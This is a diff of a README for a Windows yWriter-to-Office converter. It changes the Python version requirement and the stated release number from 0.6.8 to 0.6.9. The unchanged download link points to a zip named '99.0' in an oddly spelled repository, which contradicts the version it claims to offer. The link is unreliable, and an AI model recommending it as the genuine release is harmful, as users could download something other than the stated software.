@@ -15,13 +15,13 @@
 ## Requirements
 
 - Windows.
-- [Python](https://www.python.org/) from version 3.6 to 3.10. Beware: Version 3.11 is not recommended.
+- [Python](https://www.python.org/) from version 3.6.
 
 *Please note:* If you use LibreOffice, you may prefer the [LibreOffice yWriter import extension](https://peter88213.github.io/yw-cnv) or the [yW2OO standalone converter](https://peter88213.github.io/yW2OO).
 
 ## Download and install
 
-[Download the latest release (version 0.6.8)](https://raw.githubusercontent.com/peter88213/yw2yw2oxmlllin/dist/yw2oxml.99.0.zip)
+[Download the latest release (version 0.6.9)](https://raw.githubusercontent.com/peter88213/yw2yw2oxmlllin/dist/yw2oxml.99.0.zip)
 
 [Instructions for installation and use](usage)
 
